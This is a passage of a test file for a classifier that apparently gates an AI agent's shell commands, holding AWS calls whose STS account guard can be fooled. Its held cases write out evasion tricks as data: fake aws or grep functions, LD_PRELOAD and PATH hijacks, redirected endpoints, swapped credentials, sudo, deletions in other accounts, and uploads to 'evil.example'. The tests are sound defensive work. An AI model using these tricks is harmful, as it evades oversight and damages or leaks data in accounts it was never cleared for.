import { describe, expect, test } from "bun:test";
import { join } from "path";
import { classifyToolCall, parseShellSnapshot, type FloorProbes, type ShellDefinitions } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";

/*
 * An AWS call chained with `&&` after an STS guard runs only in the account
 * the guard pins. Besides `[ "$(aws sts get-caller-identity --query Account
 * …)" = <id> ]`, the guard may be `aws sts get-caller-identity … | grep -q
 * <pattern>` anchored where the output prints the account: the whole line
 * for `--query Account` (`grep -qx <id>`, `grep -q '^<id>$'`), the line's
 * start for `--query Arn` (`grep -q '^arn:aws:sts::<id>:…'`, or iam). A
 * guarded `aws lambda invoke` in a personal account is allowed, its outfile
 * checked as any write. An unanchored pattern is an unproven guard: an IAM
 * user path in another account may carry the personal ARN, so the call is
 * held as one with no guard. So is the same call in an unlisted account,
 * after a guard joined with `;` or `||`, before the guard, under a guard
 * whose pattern doesn't pin the account (`-v`, a regex that matches other
 * ids, the whole identity) or a deploy in another account, or whose STS
 * call may reach another endpoint (an endpoint variable, a config or
 * credentials file of the command's own, a config setting an endpoint).
 * So is a guarded call whose account the pin no longer covers: a profile or
 * credentials the floor can't read, account variables of its own,
 * AWS_PROFILE and AWS_DEFAULT_PROFILE disagreeing, another user (sudo, su,
 * runuser), or another account's resource named by ARN.
 */

const HOME = join("/", "fake", "home");
const DATA = join(HOME, ".local", "share", "standup");
const ROOT = join(DATA, "worktrees", "standup", "feat-1");
const INSTALL = join("/", "fake", "install");
const COMMON = join("/", "fake", "repo", ".git");
const SCRATCH = join(HOME, ".cache", "standup-scratch");
const OWN_SCRATCH = join(SCRATCH, "launch-1");
const PERSONAL = "444455556666";
const OTHER = "111122223333";

const config: FloorConfig = {
  v: 1,
  collectorUrl: "http://127.0.0.1:17777",
  launchId: "launch-1",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [PERSONAL],
  worktreeRoots: [join(DATA, "worktrees")],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [join(INSTALL, "packages", "collector", "src", "floor")],
  installDir: INSTALL,
  protectedPaths: [join(DATA, "secrets"), SCRATCH],
  tmpDirs: ["/tmp", OWN_SCRATCH],
  scratchRoot: SCRATCH,
  scratchDir: OWN_SCRATCH,
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
};

const FILES: Record<string, string> = {
  [join(ROOT, ".git")]: `gitdir: ${COMMON}/worktrees/feat-1\n`,
  [join(ROOT, "package.json")]: "{}\n",
  [join(OWN_SCRATCH, "x")]: "x\n",
};

/** `hookEnv` and `files` add to the hook's environment and the files the floor sees. */
function probes(hookEnv: Record<string, string> = {}, files: Record<string, string> = {}): Partial<FloorProbes> {
  const all = { ...FILES, ...files };
  const dirs = new Set<string>(["/", "/tmp", ROOT, OWN_SCRATCH]);
  for (const f of Object.keys(all)) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(join(ROOT, ".git"));
  const defs: ShellDefinitions = { aliases: new Map(), functions: new Map() };
  parseShellSnapshot("", defs);
  const env: Record<string, string> = { TMPDIR: OWN_SCRATCH, HOME, ...hookEnv };
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: (dir) => (dir === ROOT ? COMMON : null),
    readFile: (p) => (p in all ? { ok: true, text: all[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in all || dirs.has(p),
    isDirectory: (p) => dirs.has(p),
    listDir: (p) => (dirs.has(p) ? [...new Set([...Object.keys(all), ...dirs].filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!))] : null),
    realpath: (p) => (p in all || dirs.has(p) ? p : null),
    homeDir: () => HOME,
    shellDefinitions: () => defs,
    awsAccount: () => null,
    now: () => Date.now(),
    env: (name) => env[name],
    gitTree: () => null,
    gitAncestor: () => null,
    gitBlob: () => ({ ok: false, reason: "missing" }),
  };
}

function bash(command: string, hookEnv: Record<string, string> = {}, files: Record<string, string> = {}): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd: ROOT }, config, probes(hookEnv, files));
}

const INVOKE = "aws lambda invoke --function-name F --payload '{}' --cli-binary-format raw-in-base64-out $TMPDIR/out.json";
const INVOKE_REGION = (out: string) => `aws lambda invoke --region us-west-2 --function-name F ${out}`;
const ARN_GUARD = (id: string) => `aws sts get-caller-identity --query Arn --output text | grep -q '^arn:aws:sts::${id}:assumed-role/Admin/'`;
/** The owner's earlier, unanchored shape. */
const UNANCHORED_ARN_GUARD = (id: string) => `aws sts get-caller-identity --query Arn --output text | grep -q 'arn:aws:sts::${id}:assumed-role/Admin/'`;
const ACCOUNT_TEST = (id: string) => `[ "$(aws sts get-caller-identity --query Account --output text)" = ${id} ]`;
const ROLE_CHECK = "aws sts get-caller-identity --query Arn --output text | grep -q assumed-role/Admin";
const ACCOUNT_GREP = (id: string) => `aws sts get-caller-identity --query Account --output text | grep -qx ${id}`;
const TEST_GUARD = ACCOUNT_TEST(PERSONAL);
const GREP_GUARD = ACCOUNT_GREP(PERSONAL);
/** The crafted ARN an IAM user in another account has under the path `/arn:aws:sts::<PERSONAL>:assumed-role/Admin/`. */
const CRAFTED = `arn:aws:iam::${OTHER}:user/arn:aws:sts::${PERSONAL}:assumed-role/Admin/bob`;

const ALLOWED: [string, string][] = [
  ["an anchored ARN guard with the account and role", `${ARN_GUARD(PERSONAL)} && ${INVOKE}`],
  ["an account test, then a role check", `${ACCOUNT_TEST(PERSONAL)} && ${ROLE_CHECK} && ${INVOKE}`],
  ["an account test on the quoted id", `[ "$(aws sts get-caller-identity --query Account --output text)" = "${PERSONAL}" ] && ${INVOKE_REGION(join(OWN_SCRATCH, "out.json"))}`],
  ["the owner's brief: grep -qx on the printed account, then a role check, out into $TMPDIR", `${ACCOUNT_GREP(PERSONAL)} && ${ROLE_CHECK} && ${INVOKE_REGION("$TMPDIR/out.json")}`],
  ["grep -qx, out into the worktree", `${ACCOUNT_GREP(PERSONAL)} && ${INVOKE_REGION(join(ROOT, "out.json"))}`],
  ["grep -qx, out into /tmp", `${ACCOUNT_GREP(PERSONAL)} && ${INVOKE_REGION("/tmp/out.json")}`],
  ["grep -qxF with --region", `aws sts get-caller-identity --region us-west-2 --query Account --output text | grep -qxF ${PERSONAL} && ${INVOKE}`],
  ["grep -q -x as separate flags", `aws sts get-caller-identity --query Account --output text | grep -q -x ${PERSONAL} && ${INVOKE}`],
  ["grep --quiet --line-regexp", `aws sts get-caller-identity --query Account --output text | grep --quiet --line-regexp ${PERSONAL} && ${INVOKE}`],
  ["grep -q '^<id>$'", `aws sts get-caller-identity --query Account --output text | grep -q '^${PERSONAL}$' && ${INVOKE}`],
  ["grep -qE '^<id>$'", `aws sts get-caller-identity --query Account --output text | grep -qE '^${PERSONAL}$' && ${INVOKE}`],
  ["an anchored sts ARN prefix alone", `aws sts get-caller-identity --query Arn --output text | grep -q '^arn:aws:sts::${PERSONAL}:' && ${INVOKE}`],
  ["an anchored sts ARN prefix under -E", `aws sts get-caller-identity --query Arn --output text | grep -qE '^arn:aws:sts::${PERSONAL}:assumed-role/Admin/' && ${INVOKE}`],
  ["a whole sts ARN under -x", `aws sts get-caller-identity --query Arn --output text | grep -qx arn:aws:sts::${PERSONAL}:assumed-role/Admin/bob && ${INVOKE}`],
  ["an anchored IAM user ARN prefix", `aws sts get-caller-identity --query Arn --output text | grep -q '^arn:aws:iam::${PERSONAL}:user/' && ${INVOKE}`],
  ["an ARN guard, then `|| exit`", `${ARN_GUARD(PERSONAL)} || exit 1; ${INVOKE}`],
  ["an ARN guard opening an `if`", `if ${ARN_GUARD(PERSONAL)}; then ${INVOKE}; fi`],
  ["a guard and call under the same AWS_PROFILE", `AWS_PROFILE=p ${ACCOUNT_GREP(PERSONAL)} && AWS_PROFILE=p ${INVOKE}`],
  ["a guard and call under agreeing profile variables", `AWS_PROFILE=p AWS_DEFAULT_PROFILE=p ${ACCOUNT_GREP(PERSONAL)} && AWS_PROFILE=p AWS_DEFAULT_PROFILE=p ${INVOKE}`],
  ["a guarded call with a region the floor can't read", `${GREP_GUARD} && aws lambda invoke --region "$(cat /tmp/r)" --function-name F /tmp/out.json`],
  ["a guarded call naming its own account's function by ARN", `${GREP_GUARD} && aws lambda invoke --function-name arn:aws:lambda:us-west-2:${PERSONAL}:function:F /tmp/out.json`],
  ["a guarded call carrying another account's ARN in its payload", `${GREP_GUARD} && aws lambda invoke --function-name F --payload '{"target":"arn:aws:lambda:us-west-2:${OTHER}:function:G"}' /tmp/out.json`],
];

const HELD: [string, string][] = [
  ["an ARN guard on an unlisted account", `${ARN_GUARD(OTHER)} && ${INVOKE}`],
  ["an account test on an unlisted account", `${ACCOUNT_TEST(OTHER)} && ${ROLE_CHECK} && ${INVOKE}`],
  ["an account grep on an unlisted account", `${ACCOUNT_GREP(OTHER)} && ${INVOKE_REGION("/tmp/out.json")}`],
  ["a guard joined with `;`", `${ARN_GUARD(PERSONAL)}; ${INVOKE}`],
  ["a guard joined with `||`", `${ARN_GUARD(PERSONAL)} || ${INVOKE}`],
  ["the invoke before the guard", `${INVOKE} && ${ARN_GUARD(PERSONAL)}`],
  ["a role check alone", `${ROLE_CHECK} && ${INVOKE}`],
  ["a bare id grepped from the ARN, which a role name may carry", `aws sts get-caller-identity --query Arn --output text | grep -q ${PERSONAL} && ${INVOKE}`],
  ["a bare id grepped from the full output", `aws sts get-caller-identity | grep -q ${PERSONAL} && ${INVOKE}`],
  ["an inverted grep", `${ACCOUNT_GREP(PERSONAL).replace("grep -qx", "grep -vqx")} && ${INVOKE}`],
  ["a grep with an alternation", `aws sts get-caller-identity --query Account --output text | grep -Eq '${PERSONAL}|.' && ${INVOKE}`],
  ["a grep with a repetition", `aws sts get-caller-identity --query Account --output text | grep -q '${PERSONAL}*' && ${INVOKE}`],
  ["a grep with a pattern file", `aws sts get-caller-identity --query Account --output text | grep -q -f /tmp/p ${PERSONAL} && ${INVOKE}`],
  ["a grep reading a file too", `aws sts get-caller-identity --query Account --output text | grep -q ${PERSONAL} /tmp/acct && ${INVOKE}`],
  ["a guard on another query", `aws sts get-caller-identity --query UserId --output text | grep -q ${PERSONAL} && ${INVOKE}`],
  ["a guard with another stage", `aws sts get-caller-identity --query Account --output text | tee /tmp/x | grep -q ${PERSONAL} && ${INVOKE}`],
  ["a guard negated", `! ${ACCOUNT_GREP(PERSONAL)} && ${INVOKE}`],
  ["a guard under another profile than the invoke", `aws sts get-caller-identity --profile p --query Account --output text | grep -q ${PERSONAL} && ${INVOKE}`],
  ["an account grep before a prod deploy", `${ACCOUNT_GREP(PERSONAL)} && AWS_PROFILE=prod aws lambda invoke --function-name F /tmp/out.json`],
  ["a prod-named function's ARN in an unlisted account", `aws lambda invoke --function-name arn:aws:lambda:us-west-2:${OTHER}:function:F-prod /tmp/out.json`],
  ["a guard piping the CLI's errors in with `|&`", `aws sts get-caller-identity --query Arn --output text |& grep -q '^arn:aws:sts::${PERSONAL}:' && ${INVOKE}`],
  ["a guard under GREP_OPTIONS", `export GREP_OPTIONS=-v; ${ACCOUNT_GREP(PERSONAL)} && ${INVOKE}`],
  ["a guard through a grep function", `grep() { true; }; ${ACCOUNT_GREP(PERSONAL)} && ${INVOKE}`],
  ["a guard with a grep redirect", `${ACCOUNT_GREP(PERSONAL)} < /tmp/acct && ${INVOKE}`],
  ["a guard with a second pattern", `aws sts get-caller-identity --query Account --output text | grep -q -e ${OTHER} ${PERSONAL} && ${INVOKE}`],
  ["a guarded invoke writing into the live Standup data dir", `${ACCOUNT_GREP(PERSONAL)} && ${INVOKE_REGION(join(DATA, "out.json"))}`],
  // Unanchored, or anchored where the output doesn't print the account alone: an unproven guard, held as a call with none.
  ["the owner's earlier unanchored ARN guard", `${UNANCHORED_ARN_GUARD(PERSONAL)} && ${INVOKE}`],
  ["the owner's earlier unanchored ARN guard, then `|| exit`", `${UNANCHORED_ARN_GUARD(PERSONAL)} || exit 1; ${INVOKE}`],
  ["an unanchored IAM user ARN prefix", `aws sts get-caller-identity --query Arn --output text | grep -q arn:aws:iam::${PERSONAL}:user/ && ${INVOKE}`],
  ["an unanchored sts ARN prefix on the whole identity", `aws sts get-caller-identity | grep -q arn:aws:sts::${PERSONAL}: && ${INVOKE}`],
  ["an anchored sts ARN prefix on the whole identity", `aws sts get-caller-identity --output text | grep -q '^arn:aws:sts::${PERSONAL}:' && ${INVOKE}`],
  ["the JSON account value on the whole identity", `aws sts get-caller-identity | grep -q '"Account": "${PERSONAL}"' && ${INVOKE}`],
  ["an unanchored grep on the printed account", `aws sts get-caller-identity --query Account --output text | grep -q ${PERSONAL} && ${INVOKE}`],
  ["a word grep on the printed account", `aws sts get-caller-identity --query Account --output text | grep -qw ${PERSONAL} && ${INVOKE}`],
  ["the printed account anchored at the start only", `aws sts get-caller-identity --query Account --output text | grep -q '^${PERSONAL}' && ${INVOKE}`],
  ["the printed account anchored at the end only", `aws sts get-caller-identity --query Account --output text | grep -q '${PERSONAL}$' && ${INVOKE}`],
  ["anchors that -F reads as text", `aws sts get-caller-identity --query Account --output text | grep -qF '^${PERSONAL}$' && ${INVOKE}`],
  ["an anchored ARN prefix that -F reads as text", `aws sts get-caller-identity --query Arn --output text | grep -qF '^arn:aws:sts::${PERSONAL}:' && ${INVOKE}`],
  ["an anchored ARN in another partition's place", `aws sts get-caller-identity --query Arn --output text | grep -q '^arn:aws:lambda::${PERSONAL}:' && ${INVOKE}`],
  ["an anchor inside the pattern", `aws sts get-caller-identity --query Arn --output text | grep -q '^arn:aws:sts::${PERSONAL}:^' && ${INVOKE}`],
  ["grep -qx on the ARN query with a bare id", `aws sts get-caller-identity --query Arn --output text | grep -qx ${PERSONAL} && ${INVOKE}`],
  ["an anchored ARN guard on an unlisted account", `aws sts get-caller-identity --query Arn --output text | grep -q '^arn:aws:iam::${OTHER}:user/' && ${INVOKE}`],
  // A pattern an IAM user path or a role name in another account may carry.
  ["an account field alone grepped from the ARN", `aws sts get-caller-identity --query Arn --output text | grep -q :${PERSONAL}: && ${INVOKE}`],
  ["a quoted id grepped from the ARN", `aws sts get-caller-identity --query Arn --output json | grep -q '"${PERSONAL}"' && ${INVOKE}`],
  ["a quoted id alone grepped from the whole identity", `aws sts get-caller-identity | grep -q '"${PERSONAL}"' && ${INVOKE}`],
  ["an ARN prefix not at the pattern's start", `aws sts get-caller-identity --query Arn --output text | grep -q user/arn:aws:sts::${PERSONAL}: && ${INVOKE}`],
  // What the pin no longer covers.
  ["grep guard, invoke under a --profile the floor can't read", `${GREP_GUARD} && aws lambda invoke --profile "$(cat /tmp/p)" --function-name F /tmp/out.json`],
  ["test guard, invoke under a --profile the floor can't read", `${TEST_GUARD} && aws lambda invoke --profile "$(cat /tmp/p)" --function-name F /tmp/out.json`],
  ["grep guard, invoke under an AWS_PROFILE the floor can't read", `${GREP_GUARD} && AWS_PROFILE=$(cat /tmp/p) aws lambda invoke --function-name F /tmp/out.json`],
  ["grep guard, invoke under access keys the floor can't read", `${GREP_GUARD} && AWS_ACCESS_KEY_ID=$(cat /tmp/k) AWS_SECRET_ACCESS_KEY=$(cat /tmp/s) aws lambda invoke --function-name F /tmp/out.json`],
  ["grep guard, invoke under literal access keys of its own", `${GREP_GUARD} && AWS_ACCESS_KEY_ID=AKIAEXAMPLE AWS_SECRET_ACCESS_KEY=x aws lambda invoke --function-name F /tmp/out.json`],
  ["grep guard, then an export the floor can't read", `${GREP_GUARD} && export AWS_PROFILE=$(cat /tmp/p) && aws lambda invoke --function-name F /tmp/out.json`],
  ["grep guard, invoke of another account's function by ARN", `${GREP_GUARD} && aws lambda invoke --function-name arn:aws:lambda:us-west-2:${OTHER}:function:F-prod /tmp/out.json`],
  ["test guard, invoke of another account's function by ARN", `${TEST_GUARD} && aws lambda invoke --function-name arn:aws:lambda:us-west-2:${OTHER}:function:F-prod /tmp/out.json`],
  ["grep guard, invoke naming its own and another account's ARNs", `${GREP_GUARD} && aws lambda invoke --function-name arn:aws:lambda:us-west-2:${PERSONAL}:function:F --qualifier arn:aws:lambda:us-west-2:${OTHER}:function:G /tmp/out.json`],
  ["grep guard, another account's stack deleted by ARN", `${GREP_GUARD} && aws cloudformation delete-stack --stack-name arn:aws:cloudformation:us-west-2:${OTHER}:stack/S/x`],
  ["grep guard, another account's resource tagged by ARN", `${GREP_GUARD} && aws lambda tag-resource --resource arn:aws:lambda:us-west-2:${OTHER}:function:F --tags a=b`],
  ["guard under AWS_PROFILE=p, invoke where AWS_DEFAULT_PROFILE is prod", `AWS_PROFILE=p ${ACCOUNT_GREP(PERSONAL)} && AWS_PROFILE=p AWS_DEFAULT_PROFILE=prod aws lambda invoke --function-name F /tmp/out.json`],
  ["guard under disagreeing profile variables", `AWS_PROFILE=p AWS_DEFAULT_PROFILE=prod ${ACCOUNT_GREP(PERSONAL)} && AWS_PROFILE=p aws lambda invoke --function-name F /tmp/out.json`],
  ["test guard under disagreeing profile variables", `${TEST_GUARD.replace("$(aws", "$(AWS_PROFILE=p AWS_DEFAULT_PROFILE=prod aws")} && AWS_PROFILE=p aws lambda invoke --function-name F /tmp/out.json`],
  ["grep guard, invoke through env with another profile", `${GREP_GUARD} && env AWS_PROFILE=prod aws lambda invoke --function-name F /tmp/out.json`],
  ["grep guard, invoke as another user", `${GREP_GUARD} && sudo -u root aws lambda invoke --function-name F /tmp/out.json`],
  ["grep guard, invoke through su", `${GREP_GUARD} && su root -c 'aws lambda invoke --function-name F /tmp/out.json'`],
  ["grep guard, invoke through runuser", `${GREP_GUARD} && runuser -u root -- aws lambda invoke --function-name F /tmp/out.json`],
  ["grep guard, a stack delete under a --profile the floor can't read", `${GREP_GUARD} && aws cloudformation delete-stack --stack-name S --profile "$(cat /tmp/p)"`],
  ["grep guard, another account's function deleted by ARN", `${GREP_GUARD} && aws lambda delete-function --function-name arn:aws:lambda:us-west-2:${OTHER}:function:F-prod`],
  ["no guard, --profile unread", `aws lambda invoke --profile "$(cat /tmp/p)" --function-name F /tmp/out.json`],
  ["no guard, as another user", `sudo -u root aws lambda invoke --function-name F /tmp/out.json`],
];

describe("an AWS call after an STS guard that pins a personal account", () => {
  for (const [name, command] of ALLOWED) {
    test(`allowed: ${name}`, () => {
      expect(bash(command)).toEqual({ action: "allow" });
    });
  }
  for (const [name, command] of HELD) {
    test(`held: ${name}`, () => {
      expect(bash(command).action).toBe("hold");
    });
  }
  test("an unanchored guard is held just as no guard is", () => {
    const gate = (v: FloorVerdict) => (v.action === "hold" ? { category: v.category, ownerOnly: v.ownerOnly } : null);
    const unguarded = gate(bash(INVOKE));
    expect(unguarded).not.toBeNull();
    for (const guard of [UNANCHORED_ARN_GUARD(PERSONAL), `aws sts get-caller-identity --query Account --output text | grep -q ${PERSONAL}`]) {
      expect(gate(bash(`${guard} && ${INVOKE}`))).toEqual(unguarded);
    }
  });
  test("held: a prod CDK deploy after the guard", () => {
    expect(bash(`${ARN_GUARD(PERSONAL)} && cdk deploy MyStack-prod`).action).toBe("hold");
  });
});

describe("STS guards whose STS call may reach another endpoint, which can print any account", () => {
  const CALL = "aws lambda invoke --region us-west-2 --function-name F /tmp/out.json";
  const AWS_CONFIG = join(HOME, ".aws", "config");
  test("control: grep -qx on --query Account is a guard", () => {
    expect(bash(`${GREP_GUARD} && ${CALL}`)).toEqual({ action: "allow" });
  });
  test("control: a config file without endpoints leaves the guard standing", () => {
    expect(bash(`${GREP_GUARD} && ${CALL}`, {}, { [AWS_CONFIG]: "[default]\nregion = us-west-2\n[profile p]\nregion = us-east-1\n" })).toEqual({ action: "allow" });
  });
  test("control: a PATH of system dirs only leaves the guard standing", () => {
    expect(bash(`export PATH=/usr/local/bin:/usr/bin:/bin; ${GREP_GUARD} && ${CALL}`)).toEqual({ action: "allow" });
  });
  test("held: grep -q unanchored on --query Account (the owner requires -x)", () => {
    expect(bash(`aws sts get-caller-identity --query Account --output text | grep -q ${PERSONAL} && ${CALL}`).action).toBe("hold");
  });
  test.each([
    ["an STS endpoint exported in the shell", `export AWS_ENDPOINT_URL_STS=http://127.0.0.1:9; ${GREP_GUARD} && ${CALL}`],
    ["an STS endpoint exported, under the test guard", `export AWS_ENDPOINT_URL_STS=http://127.0.0.1:9; ${TEST_GUARD} && ${CALL}`],
    ["a global endpoint exported in the shell", `export AWS_ENDPOINT_URL=http://127.0.0.1:9; ${GREP_GUARD} && ${CALL}`],
    ["an STS endpoint set in the shell, not exported", `AWS_ENDPOINT_URL_STS=http://127.0.0.1:9; ${GREP_GUARD} && ${CALL}`],
    ["an STS endpoint on the STS call", `AWS_ENDPOINT_URL_STS=http://127.0.0.1:9 ${GREP_GUARD} && ${CALL}`],
    ["an STS endpoint as an option", `aws sts get-caller-identity --endpoint-url http://127.0.0.1:9 --query Account --output text | grep -qx ${PERSONAL} && ${CALL}`],
    ["a config file exported by the command", `export AWS_CONFIG_FILE=/tmp/c; ${GREP_GUARD} && ${CALL}`],
    ["a credentials file exported by the command", `export AWS_SHARED_CREDENTIALS_FILE=/tmp/c; ${GREP_GUARD} && ${CALL}`],
    ["a config file on the STS call", `AWS_CONFIG_FILE=/tmp/c ${GREP_GUARD} && ${CALL}`],
    ["another HOME exported by the command", `export HOME=/tmp/h; ${GREP_GUARD} && ${CALL}`],
    // Code loaded into the CLI.
    ["LD_PRELOAD exported", `export LD_PRELOAD=/tmp/x.so; ${GREP_GUARD} && ${CALL}`],
    ["LD_LIBRARY_PATH exported", `export LD_LIBRARY_PATH=/tmp/lib; ${GREP_GUARD} && ${CALL}`],
    ["LD_AUDIT exported", `export LD_AUDIT=/tmp/a.so; ${GREP_GUARD} && ${CALL}`],
    ["PYTHONPATH exported", `export PYTHONPATH=/tmp/py; ${GREP_GUARD} && ${CALL}`],
    ["PYTHONHOME exported", `export PYTHONHOME=/tmp/py; ${GREP_GUARD} && ${CALL}`],
    ["PYTHONSTARTUP exported", `export PYTHONSTARTUP=/tmp/s.py; ${GREP_GUARD} && ${CALL}`],
    ["DYLD_INSERT_LIBRARIES exported", `export DYLD_INSERT_LIBRARIES=/tmp/x.dylib; ${GREP_GUARD} && ${CALL}`],
    ["PYTHONPATH exported, under the test guard", `export PYTHONPATH=/tmp/py; ${TEST_GUARD} && ${CALL}`],
    ["PYTHONPATH set in the shell, not exported", `PYTHONPATH=/tmp/py; ${GREP_GUARD} && ${CALL}`],
    ["LD_PRELOAD on the STS call", `LD_PRELOAD=/tmp/x.so ${GREP_GUARD} && ${CALL}`],
    ["PYTHONPATH on the STS call inside the test guard", `${TEST_GUARD.replace("$(aws", "$(PYTHONPATH=/tmp/py aws")} && ${CALL}`],
    // A fake aws ahead of the real one.
    ["a PATH with a scratch dir first", `export PATH=/tmp/bin:$PATH; ${GREP_GUARD} && ${CALL}`],
    ["a PATH with a scratch dir first, not exported", `PATH=/tmp/bin:$PATH; ${GREP_GUARD} && ${CALL}`],
    ["a PATH on the STS call", `PATH=/tmp/bin:/usr/bin:/bin ${GREP_GUARD} && ${CALL}`],
    ["a PATH with a scratch dir first, under the test guard", `export PATH=/tmp/bin:$PATH; ${TEST_GUARD} && ${CALL}`],
    ["a PATH naming a scratch dir after the system ones", `export PATH=/usr/bin:/bin:/tmp/bin; ${GREP_GUARD} && ${CALL}`],
    ["an aws function that fakes only STS", `aws() { if [ "$1" = sts ]; then echo ${PERSONAL}; else command aws "$@"; fi; }; ${GREP_GUARD} && ${CALL}`],
  ])("held: %s", (_name, command) => {
    expect(bash(command).action).toBe("hold");
  });
  test.each([
    ["AWS_ENDPOINT_URL_STS", { AWS_ENDPOINT_URL_STS: "http://127.0.0.1:9" }],
    ["AWS_ENDPOINT_URL", { AWS_ENDPOINT_URL: "http://127.0.0.1:9" }],
  ])("held: %s in the hook's environment", (_name, env) => {
    expect(bash(`${GREP_GUARD} && ${CALL}`, env).action).toBe("hold");
  });
  test.each([
    ["an endpoint_url in a profile", { [AWS_CONFIG]: "[default]\nregion = us-west-2\n[profile x]\nendpoint_url = http://127.0.0.1:9\n" }, {}],
    ["a services section", { [AWS_CONFIG]: "[default]\nservices = stub\n[services stub]\nsts =\n  endpoint_url = http://127.0.0.1:9\n" }, {}],
    ["a ca_bundle", { [AWS_CONFIG]: "[default]\nca_bundle = /tmp/ca.pem\n" }, {}],
    ["a plugins section", { [AWS_CONFIG]: "[default]\nregion = us-west-2\n[plugins]\nfake = fakeplugin\n" }, {}],
    ["an endpoint_url in the credentials file", { [join(HOME, ".aws", "credentials")]: "[default]\nendpoint_url = http://127.0.0.1:9\n" }, {}],
    ["an endpoint_url in the config file the hook's env names", { "/tmp/other-config": "[default]\nendpoint_url = http://127.0.0.1:9\n" }, { AWS_CONFIG_FILE: "/tmp/other-config" }],
  ])("held: the CLI's config with %s", (_name, files, env) => {
    expect(bash(`${GREP_GUARD} && ${CALL}`, env, files).action).toBe("hold");
  });
});

describe("a guarded call that picks other credentials or another endpoint than the guard checked", () => {
  const RM = "aws s3 rm s3://bucket/key";
  test.each([
    [`${GREP_GUARD} && ${RM}`],
    [`${TEST_GUARD} && ${RM}`],
    [`${GREP_GUARD} || exit 1; ${RM}`],
    [`${GREP_GUARD} && ${RM} --region us-east-1`],
    [`${GREP_GUARD} && aws lambda invoke --function-name "$(cat /tmp/f)" /tmp/out.json`],
    [`${GREP_GUARD} && python3 -c "import boto3; boto3.client('s3').delete_object(Bucket='b', Key='k')"`],
    [`${GREP_GUARD} && python3 -c "import boto3; boto3.Session().client('s3').delete_object(Bucket='b', Key='k')"`],
    [`${GREP_GUARD} && python3 -c "import boto3; boto3.Session(region_name='us-west-2').client('s3').delete_object(Bucket='b', Key='k')"`],
  ])("control: %s is allowed", (command) => {
    expect({ command, verdict: bash(command) }).toEqual({ command, verdict: { action: "allow" } });
  });
  test.each([
    // An abbreviated option: the CLI takes any unambiguous prefix.
    [`${GREP_GUARD} && ${RM} --prof other`],
    [`${GREP_GUARD} && ${RM} --pro=other`],
    [`${TEST_GUARD} && ${RM} --prof other`],
    [`${GREP_GUARD} && ${RM} --endpoint http://evil`],
    [`${GREP_GUARD} && ${RM} --no-sign`],
    // Another endpoint, trust store or no signing at all.
    [`aws sts get-caller-identity --query Account --output text | grep -qix ${PERSONAL} && ${RM} --region us-east-1 --endpoint-url http://evil`],
    [`${GREP_GUARD} && aws s3 rm s3://bucket/key --no-sign-request`],
    [`${GREP_GUARD} && ${RM} --ca-bundle /tmp/ca.pem`],
    [`${GREP_GUARD} && ${RM} --no-verify-ssl`],
    [`${GREP_GUARD} && AWS_ENDPOINT_URL=http://x ${RM}`],
    [`${GREP_GUARD} && AWS_ENDPOINT_URL_S3=http://x ${RM}`],
    [`${GREP_GUARD} && export AWS_ENDPOINT_URL=http://x && ${RM}`],
    // A word in option position the floor can't read may be any option.
    [`${GREP_GUARD} && ${RM} "$(cat /tmp/opt)" other`],
    // The CLI's config or login changed after the guard.
    [`${GREP_GUARD} && aws configure set aws_access_key_id AKIA && ${RM}`],
    [`${GREP_GUARD} && aws configure import --csv file:///tmp/c.csv && ${RM}`],
    [`${GREP_GUARD} && aws sso login --profile other && ${RM}`],
    // SDK code that picks credentials of its own.
    [`${GREP_GUARD} && python3 -c "import boto3; boto3.Session(profile_name='other').client('s3').delete_object(Bucket='b', Key='k')"`],
    [`${GREP_GUARD} && python3 -c "import boto3, os; os.environ['AWS_PROFILE']='other'; boto3.client('s3').delete_object(Bucket='b', Key='k')"`],
    [`${GREP_GUARD} && python3 -c "import boto3; boto3.client('s3', aws_access_key_id='AKIA', aws_secret_access_key='x').delete_object(Bucket='b', Key='k')"`],
    [`${GREP_GUARD} && node -e "process.env.AWS_PROFILE='other'; const { S3Client, DeleteObjectCommand } = require('@aws-sdk/client-s3'); new S3Client({}).send(new DeleteObjectCommand({ Bucket: 'b', Key: 'k' }))"`],
    [`${GREP_GUARD} && node -e "const { fromIni } = require('@aws-sdk/credential-providers'); const { S3Client, DeleteObjectCommand } = require('@aws-sdk/client-s3'); new S3Client({ credentials: fromIni({ profile: 'other' }) }).send(new DeleteObjectCommand({ Bucket: 'b', Key: 'k' }))"`],
  ])("%s is held", (command) => {
    expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
  });
  // A global option after the operands is not the destination: the upload is still one.
  test.each([
    [`aws s3 cp /tmp/x s3://bucket/key --region us-east-1`],
    [`aws s3 cp ${HOME}/notes.txt s3://bucket/key --profile p`],
    [`aws s3 sync ${ROOT} s3://bucket/ --region us-east-1`],
    [`aws s3 cp /tmp/x s3://bucket/key --endpoint-url https://evil.example`],
  ])("an upload with a trailing value option, %s, is held", (command) => {
    expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
  });
  test("control: a download with a trailing value option is allowed", () => {
    expect(bash("aws s3 cp s3://bucket/key /tmp/x --region us-east-1")).toEqual({ action: "allow" });
  });
});

describe("STS grep guards against an IAM user path in another account that carries the personal ARN", () => {
  // grep matches a line holding the pattern anywhere unless it is anchored; IAM paths may hold `:`.
  const grepMatches = (pattern: string, line: string) => new RegExp(pattern).test(line);
  test("the crafted ARN is in another account and carries the personal sts prefix", () => {
    expect(CRAFTED.startsWith(`arn:aws:iam::${OTHER}:`)).toBe(true);
    expect(grepMatches(`arn:aws:sts::${PERSONAL}:assumed-role/Admin/`, CRAFTED)).toBe(true);
    expect(grepMatches(`arn:aws:iam::${OTHER}:user/arn:aws:iam::${PERSONAL}:user/`, `arn:aws:iam::${OTHER}:user/arn:aws:iam::${PERSONAL}:user/bob`)).toBe(true);
  });
  test("each accepted anchored ARN pattern misses the crafted ARN", () => {
